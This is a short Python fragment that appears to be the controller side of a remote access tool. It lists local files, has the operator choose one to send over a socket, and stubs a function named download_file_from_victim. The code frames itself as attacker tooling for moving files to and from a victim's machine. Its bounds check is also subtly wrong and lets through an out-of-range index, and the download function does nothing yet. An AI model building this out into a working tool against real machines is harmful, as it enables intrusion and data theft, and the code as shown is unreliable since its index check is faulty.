import os

def upload_files(my_socket):
    files = [f for f in os.listdir('.') if os.path.isfile(f)]
    for index, file in enumerate(files):
        print("\t\t", index, "\t", file)
    check = True
    while check:
        file_num = int(input("[+] Enter the file number you want to send : "))
        if len(files) >= file_num >= 0:
            filename = files[file_num]
            check = False

        else:
            print("[-] Invalid file selected, try again")
    my_socket.send_files(filename)

def download_file_from_victim(my_socket):
    print("[+] Downloading File")